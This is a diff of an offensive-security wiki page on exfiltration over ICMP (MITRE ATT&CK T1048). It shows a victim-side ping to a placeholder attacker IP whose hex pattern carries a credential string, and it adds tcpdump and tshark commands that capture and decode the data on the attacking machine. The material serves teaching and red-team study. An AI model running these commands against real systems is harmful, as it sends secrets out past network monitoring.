@@ -2,11 +2,11 @@
 description: MITRE ATT&CK™  - Exfiltration Over Alternative Protocol - Technique T1048
 ---
 
-# Over ICMP
+# Exfiltration over ICMP
 
 ## Theory
 
-The Internet Control Message Protocol [ICMP](https://en.wikipedia.org/wiki/Internet\_Control\_Message\_Protocol). It is a network layer protocol used to handle error reporting.
+The Internet Control Message Protocol [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol). It is a network layer protocol used to handle error reporting.
 
 ### ICMP Data Section
 
@@ -29,6 +29,16 @@ root@victime$ ping ATTACKING_IP -c 1 -p 726f6f743a7040737377307264210a
 {% hint style="danger" %}
 Note that the -p option is only available for **Linux operating systems**. We can confirm that by checking the ping's help manual page.
 {% endhint %}
+
+On the attacking machine, we can receive the data as follows
+
+```bash
+# Listen for ping and save to pass.pcap
+v4resk@kali$ sudo tcpdump icmp -i lo -w pass.pcap
+
+# Extract data field and Hex decode
+v4resk@kali$  tshark -r pass.pcap -Y "icmp" -T fields -e data | xxd -r -p
+```
 {% endtab %}
 
 {% tab title="metasploit" %}
